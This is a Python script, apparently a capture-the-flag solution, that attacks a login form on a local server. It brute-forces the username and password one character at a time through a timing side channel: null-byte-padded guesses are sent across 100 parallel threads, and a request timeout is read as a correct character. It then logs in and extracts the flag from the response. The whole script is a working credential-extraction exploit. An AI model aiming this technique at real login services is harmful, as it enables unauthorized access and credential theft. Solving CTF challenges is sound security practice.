
import concurrent.futures
import json
from string import printable

# from icecream import ic as print
from requests import ReadTimeout, post

endpoint = "http://localhost:50364/"

def send(a, character, do_username):
    test = "\x00" * len(a) + character
    data = {"username": test, "password": ""} if do_username else {
        "username": "", "password": test}
    try:
        post(endpoint, data=data, timeout=0.8)
    except ReadTimeout:
        return character
    return None

def brute(do_username, known=""):
    while True:
        found = False
        with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
            futures = [
                executor.submit(send, known, printable[i], do_username)
                for i in range(1, 100)
            ]
            for future in concurrent.futures.as_completed(futures):
                result = future.result()
                if result is not None:
                    known += result
                    found = True
                    break
        print(known)

        if not found:
            return known


username = brute(do_username=True, known="")
password = brute(do_username=False, known="")
print(username, password)

response = post(
    endpoint,
    data={
        "username": username,
        "password": password
    }
)
print(response.text)
if response.ok:
    flag_data = json.loads(response.json()["data"])
    flag_index = flag_data[0]["flag"]
    flag = flag_data[flag_index]
    print(flag)
